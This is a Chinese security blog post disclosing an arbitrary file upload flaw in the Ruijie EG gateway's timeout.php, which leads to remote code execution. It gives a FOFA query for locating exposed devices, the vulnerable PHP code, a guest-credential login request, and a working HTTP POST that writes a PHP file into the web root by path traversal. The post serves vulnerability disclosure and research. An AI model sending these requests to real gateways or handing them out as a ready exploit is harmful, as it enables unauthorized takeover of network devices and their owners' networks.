---
title: "锐捷-EWEB timeout.php 文件上传漏洞"
source: https://mrxn.net/jswz/ruijieweb-system_pi-timeout-rce.html
asset_dir: assets/锐捷-eweb-timeout.php-文件上传漏洞
---

# 锐捷-EWEB timeout.php 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/27 18:43
- 1074浏览
- [0评论](#comment)
- 12分钟阅读

深入探索

文本剥离工具

VPN服务

网络安全会议

---

# 漏洞简介

锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。锐捷EG易网关 `timeout.php` 存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，攻击者可以利用该漏洞向设备上传任意文件，造成设备[远程代码执行](https://mrxn.net/tag/rce)和被控制。

漏洞扫描服务

# 影响版本

<=2022.07.28.01

# fofa语法

> `title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"`

# 漏洞分析

看下 `timeout.php` 关键业务 `uploadAction` 逻辑的实现

```
function uploadAction() {
    $fileName = p("fileName");
    $mes = p("mes");
    $mes = iconv("utf-8","GBK//IGNORE",$mes);
    $fp = fopen(DS . "data" . DS . $fileName , "w");
    if ($fp && fwrite($fp, $mes)) {
        fclose($fp);
        json_echo(true);
    } else {
        json_echo(FALSE);
    }
}
```

`uploadAction` 接收一个 `fileName` 参数用作 `fopen` 函数的写入文件名，`mes` 参数的值作为写入文件的内容，无任何过滤或校验，因此造成任意[文件上传漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

## 获取cookie

```
POST /ddi/server/login.php HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded

username=guest&password=guest?
```

深入探索

文件大小转换

数据库

在线安全工具

[![锐捷-EWEB timeout.php 文件上传漏洞](images/img-001-489e6f4b63e4.webp)](https://image.mrxn.net/e2433a412d6049e3b49ff42339f02422.webp)

## 上传文件

```
POST /system_pi/timeout.php?a=upload HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

fileName=../tmp/html/test1.php&mes=<?=phpinfo();unlink(__FILE__);
```

访问上传文件 /test1.php

漏洞扫描服务

[![锐捷-EWEB timeout.php 文件上传漏洞](images/img-002-16138cb71c67.webp)](https://image.mrxn.net/96afd23ce73e495e83a6eebdd73a58f2.webp)

成功打印 phpinfo 信息

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.获取cookie](#toc-5-1-)
- [5.2.上传文件](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

计算机安全
